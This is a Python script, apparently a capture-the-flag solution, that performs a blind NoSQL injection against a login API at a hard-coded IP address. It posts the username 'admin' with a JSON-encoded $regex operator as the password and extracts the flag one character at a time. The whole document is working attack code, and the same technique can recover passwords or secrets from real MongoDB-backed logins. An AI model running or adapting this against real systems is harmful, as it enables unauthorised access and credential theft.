#!/usr/bin/env python3

import requests
import json
import string

TARGET = "http://46.250.231.233:1339/api/login"

# Characters to test
CHARS = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_{}-!@#$%^&*() "

def test_char(flag, char):
    """Test if the flag starts with flag+char using regex"""
    # Escape special regex characters
    escaped_char = char
    if char in r'\.^$*+?{}[]()|\-':
        escaped_char = '\\' + char
    
    regex = f"^{flag}{escaped_char}"
    
    payload = {
        "username": "admin",
        "password": json.dumps({"$regex": regex})
    }
    
    try:
        response = requests.post(TARGET, json=payload, timeout=5)
        data = response.json()
        return data.get("success", False)
    except Exception as e:
        print(f"Error: {e}")
        return False

def extract_flag():
    """Extract the flag character by character using blind NoSQL injection"""
    print("Starting Blind NoSQL Injection Attack...")
    print(f"Target: {TARGET}\n")
    
    flag = ""
    position = 0
    max_length = 100
    
    while position < max_length:
        found = False
        
        for char in CHARS:
            if test_char(flag, char):
                flag += char
                found = True
                print(f"\rCurrent flag: {flag}", end="", flush=True)
                
                # Check if we found the closing brace
                if char == "}":
                    print("\n")
                    print("=" * 50)
                    print(f"FLAG EXTRACTED: {flag}")
                    print("=" * 50)
                    return flag
                
                break
        
        if not found:
            print("\n")
            print("=" * 50)
            print(f"FLAG EXTRACTED: {flag}")
            print("=" * 50)
            break
        
        position += 1
    
    return flag

if __name__ == "__main__":
    extract_flag()
